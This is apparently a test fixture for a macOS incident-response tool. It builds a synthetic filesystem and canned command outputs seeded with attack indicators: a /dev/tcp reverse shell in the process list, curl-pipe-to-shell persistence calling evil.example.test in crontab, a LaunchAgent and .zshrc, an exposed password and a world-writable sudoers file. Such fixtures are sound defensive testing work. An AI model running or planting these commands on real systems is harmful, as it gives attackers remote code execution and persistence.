"""Builds a synthetic fake macOS filesystem + fake command runner for deterministic tests/demos.

Everything is invented: documentation-range IPs (RFC 5737), *.example.test domains, and a harmless text file
standing in for a malicious binary. No real macOS data is used.
"""

from __future__ import annotations

import hashlib
import os
import plistlib
from datetime import UTC, datetime
from pathlib import Path

from mac_ir.utils.run import CommandResult

NOW = datetime(2026, 3, 10, 12, 0, 0, tzinfo=UTC)
FIXED_MTIME = 1_772_000_000
FAKE_BINARY = b"SYNTHETIC TEST FILE - NOT A REAL BINARY - safe to delete\n"
FAKE_BINARY_SHA256 = hashlib.sha256(FAKE_BINARY).hexdigest()
HOME = "Users/analyst"

PS_META = """\
    1     0     0 root     Ss   Mon Mar  9 10:00:00 2026 /sbin/launchd
  401     1     0 root     Ss   Mon Mar  9 10:00:05 2026 /usr/sbin/sshd
  602     1   501 analyst  S    Tue Mar 10 08:00:01 2026 /Applications/Safari.app/Contents/MacOS/Safari
  977     1   501 analyst  S    Tue Mar 10 09:30:00 2026 /private/tmp/.cache/kworker-upd
 1310   602   501 analyst  S    Tue Mar 10 10:00:00 2026 /usr/bin/mysql
 1400   401   501 analyst  S    Tue Mar 10 11:00:00 2026 /bin/bash
"""
PS_ARGS = """\
    1 /sbin/launchd
  401 /usr/sbin/sshd -D
  602 /Applications/Safari.app/Contents/MacOS/Safari
  977 /private/tmp/.cache/kworker-upd --daemon
 1310 mysql --user=app --password=hunter2-synthetic -h db.example.test
 1400 bash -c bash -i >& /dev/tcp/198.51.100.23/4444 0>&1
"""
LSOF = """\
p401
csshd
Lroot
f3
PTCP
n*:22
TST=LISTEN
p977
ckworker-upd
Lanalyst
f3
PTCP
n*:4444
TST=LISTEN
f4
PTCP
n10.0.0.5:51234->203.0.113.50:443
TST=ESTABLISHED
p602
cSafari
Lanalyst
f9
PUDP
n*:5353
"""
IFCONFIG = """\
lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> mtu 16384
\tinet 127.0.0.1 netmask 0xff000000
en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
\tinet 10.0.0.5 netmask 0xffffff00 broadcast 10.0.0.255
\tinet6 fe80::1%en0 prefixlen 64 scopeid 0x4
"""
NETSTAT_R = """\
Routing tables

Internet:
Destination        Gateway            Flags           Netif Expire
default            10.0.0.1           UGScg             en0
10.0.0/24          link#4             UCS               en0
"""
LOG_NDJSON = "\n".join(
    [
        '{"timestamp":"2026-03-10 11:%02d:%02d.000000+0000","processImagePath":"/usr/sbin/sshd","processID":401,'
        '"eventMessage":"Failed password for invalid user admin from 203.0.113.50 port %d ssh2","messageType":"Default"}'
        % (40 + i // 2, (i * 7) % 60, 40000 + i)
        for i in range(12)
    ]
    + [
        '{"timestamp":"2026-03-10 11:50:30.000000+0000","processImagePath":"/usr/sbin/sshd","processID":401,'
        '"eventMessage":"Accepted password for root from 203.0.113.50 port 40100 ssh2"}',
        '{"timestamp":"2026-03-10 11:55:01.000000+0000","processImagePath":"/usr/bin/sudo","processID":900,'
        '"eventMessage":"    analyst : TTY=ttys000 ; PWD=/Users/analyst ; USER=root ; COMMAND=/usr/bin/id"}',
        '{"timestamp":"2026-03-10 11:56:00.000000+0000","processImagePath":"/usr/sbin/sshd","processID":401,'
        '"eventMessage":"Failed password for <private> from 198.51.100.77 port 22 ssh2"}',
        '{"timestamp":"2025-12-01 00:00:00.000000+0000","processImagePath":"/usr/sbin/sshd","processID":1,'
        '"eventMessage":"Failed password for root from 192.0.2.9 port 1 ssh2"}',
        '{"timestamp":"2026-03-10 11:57:00.000000+0000","processImagePath":"/usr/bin/other","processID":2,'
        '"eventMessage":"irrelevant"}',
        "this line is malformed and must be skipped",
    ]
    + [
        '{"timestamp":"2026-03-10 11:58:%02d.000000+0000","processImagePath":"/usr/bin/sudo","processID":901,'
        '"eventMessage":"pam_opendirectory: authentication failure; user=analyst"}' % (i * 10)
        for i in range(3)
    ]
)
CODESIGN_UNSIGNED = "/private/tmp/.cache/kworker-upd: code object is not signed at all\n"
CODESIGN_SIGNED = "Identifier=com.example.synth\nAuthority=Developer ID Application: Synthetic Corp (ABCDE12345)\nTeamIdentifier=ABCDE12345\n"

OUTPUTS: dict[tuple[str, ...], str] = {
    ("sw_vers",): "ProductName:\t\tmacOS\nProductVersion:\t\t14.4.1\nBuildVersion:\t\t23E224\n",
    ("uname", "-m"): "arm64\n",
    ("sysctl", "-n", "sysctl.proc_translated"): "0\n",
    ("hostname",): "synthetic-mac.local\n",
    ("sysctl", "-n", "kern.boottime"): "{ sec = 1772900000, usec = 0 } Mon Mar  9 10:00:00 2026\n",
    ("csrutil", "status"): "System Integrity Protection status: enabled.\n",
    ("spctl", "--status"): "assessments enabled\n",
    ("fdesetup", "status"): "FileVault is On.\n",
    ("/usr/libexec/ApplicationFirewall/socketfilterfw", "--getglobalstate"): "Firewall is disabled. (State = 0)\n",
    ("who",): "analyst  console  Mar  9 10:05\nanalyst  ttys000  Mar 10 11:30 (198.51.100.77)\n",
    ("df", "-k"): "Filesystem 1024-blocks Used Available Capacity iused ifree %iused Mounted on\n"
    "/dev/disk3s1s1 488245288 20000000 300000000 7% 400000 3000000000 0% /\n",
    ("ps", "-axo", "pid=,ppid=,uid=,user=,stat=,lstart=,comm="): PS_META,
    ("ps", "-axww", "-o", "pid=,command="): PS_ARGS,
    ("lsof", "-nP", "-i", "-F", "pcLPnT"): LSOF,
    ("ifconfig", "-a"): IFCONFIG,
    ("netstat", "-rn"): NETSTAT_R,
    ("crontab", "-l"): "*/10 * * * * curl -s http://evil.example.test/c.sh | sh\n",
    ("codesign", "-dv", "--verbose=2", "/private/tmp/.cache/kworker-upd"): CODESIGN_UNSIGNED,
    ("codesign", "-dv", "--verbose=2", "/usr/sbin/sshd"): CODESIGN_SIGNED,
}


def fake_runner_factory(log_output: str = LOG_NDJSON):
    def runner(argv: list[str], timeout: float, max_bytes: int) -> CommandResult:
        key = tuple(argv)
        if key in OUTPUTS:
            text = OUTPUTS[key]
            if argv[0] == "codesign":
                return CommandResult(argv=list(argv), returncode=0 if "Authority" in text else 1, stderr=text)
            return CommandResult(argv=list(argv), returncode=0, stdout=text)
        if argv[:2] == ["log", "show"]:
            return CommandResult(argv=list(argv), returncode=0, stdout=log_output)
        return CommandResult(argv=list(argv), error_kind="not_found", error=f"{argv[0]}: not found (synthetic)")

    return runner


fake_runner = fake_runner_factory()


def _w(root: Path, rel: str, data: str | bytes, mode: int = 0o644) -> Path:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(data.encode() if isinstance(data, str) else data)
    p.chmod(mode)
    return p


def _plist(root: Path, rel: str, doc: dict, mode: int = 0o644, binary: bool = False) -> None:
    fmt = plistlib.FMT_BINARY if binary else plistlib.FMT_XML
    _w(root, rel, plistlib.dumps(doc, fmt=fmt), mode)


def build_rootfs(root: Path) -> Path:
    root.mkdir(parents=True, exist_ok=True)
    for exe in ("sbin/launchd", "usr/sbin/sshd", "usr/bin/mysql", "bin/bash", "usr/local/bin/helper"):
        _w(root, exe, f"synthetic {exe}\n", 0o755)
    _w(root, "private/tmp/.cache/kworker-upd", FAKE_BINARY, 0o755)
    _w(root, "private/tmp/notes.txt", "harmless\n")
    _w(root, "Applications/Safari.app/Contents/MacOS/Safari", "synthetic safari\n", 0o755)
    _plist(
        root,
        "Library/LaunchDaemons/com.example.updater.plist",
        {
            "Label": "com.example.updater",
            "ProgramArguments": ["/private/tmp/.cache/kworker-upd", "--daemon"],
            "RunAtLoad": True,
            "KeepAlive": True,
        },
    )
    _plist(
        root,
        "Library/LaunchDaemons/com.example.backup.plist",
        {"Label": "com.example.backup", "Program": "/usr/local/bin/missing-backup", "StartInterval": 3600},
    )
    _plist(
        root,
        "Library/LaunchDaemons/com.example.sshd.plist",
        {"Label": "com.example.sshd", "ProgramArguments": ["/usr/sbin/sshd", "-D"], "RunAtLoad": True},
    )
    _plist(
        root,
        "Library/LaunchDaemons/com.example.loose.plist",
        {"Label": "com.example.loose", "ProgramArguments": ["/usr/local/bin/helper"]},
        mode=0o666,
    )
    _plist(
        root,
        f"{HOME}/Library/LaunchAgents/com.example.agent.plist",
        {
            "Label": "com.example.agent",
            "ProgramArguments": ["/bin/bash", "-c", "curl -s http://evil.example.test/a.sh | sh"],
            "RunAtLoad": True,
        },
        binary=True,
    )
    _w(root, "Library/LaunchDaemons/broken.plist", "<plist><dict><key>Label</key>")  # malformed on purpose
    _w(root, "Library/LaunchAgents/notes.txt", "stray file")
    _w(root, "Library/StartupItems/OldThing/OldThing", "#!/bin/sh\n", 0o755)
    _w(
        root,
        f"{HOME}/.zshrc",
        "# synthetic\nexport EDITOR=vim\nalias ll='ls -l'\ncurl http://evil.example.test/x.sh | sh\n",
    )
    _w(root, "etc/zshrc", "# system zshrc\n")
    _w(root, "etc/hosts", "127.0.0.1 localhost\n")
    _w(root, "etc/sudoers", "root ALL=(ALL) ALL\n", 0o666)  # world-writable on purpose (synthetic finding)
    _w(root, "etc/paths", "/usr/local/bin\n/usr/bin\n")
    for p in root.rglob("*"):
        if not p.is_symlink():
            os.utime(p, (FIXED_MTIME, FIXED_MTIME))
    return root


__all__ = ["build_rootfs", "fake_runner", "fake_runner_factory", "NOW", "FAKE_BINARY_SHA256", "HOME"]
